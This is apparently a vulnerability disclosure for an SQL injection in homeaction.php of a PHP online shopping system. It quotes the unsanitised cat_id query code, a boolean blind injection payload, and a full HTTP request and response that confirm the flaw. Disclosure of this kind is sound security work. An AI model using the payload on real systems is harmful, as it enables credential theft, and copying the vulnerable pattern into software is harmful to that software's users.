## ONLINE SHOPPING SYSTEM homeaction.php SQL Injection Vulnerability

### I. Vulnerability Impact

An attacker can exploit this vulnerability to extract sensitive data from the database via boolean-based blind SQL injection, including plaintext user passwords from the `user_info` table and admin credentials from the `admin_info` table.

### II. Source Code Analysis

The vulnerability resides in `homeaction.php`, lines 171-174:

```php
if(isset($_POST["get_seleted_Category"]) || isset($_POST["search"])){
    if(isset($_POST["get_seleted_Category"])){
        $id = $_POST["cat_id"];
        $sql = "SELECT * FROM products,categories WHERE product_cat = '$id' AND product_cat=cat_id";
```

The `$id` variable is taken directly from `$_POST["cat_id"]` without any filtering and concatenated into the SQL statement. An attacker can inject malicious SQL fragments through the `cat_id` parameter to manipulate the query logic. When the injected condition evaluates to false, the query returns zero rows and the response body is empty (Content-Length: 0), confirming the injection is exploitable.

### III. Payload

The core injection payload is:

```
3'and'r'='k
```

After injection, the actual executed SQL becomes:

```sql
SELECT * FROM products,categories WHERE product_cat = '3'and'r'='k' AND product_cat=cat_id
```

HTTP request and response:

```
POST /homeaction.php HTTP/1.1
Host: onlineshop
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

get_seleted_Category=1&cat_id=3'and'r'='k

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 0
```

A Content-Length of 0 with a 200 status code indicates the boolean false condition caused zero rows to be returned, confirming the vulnerability.

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/

![image-20260627105843602](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627105843602.png)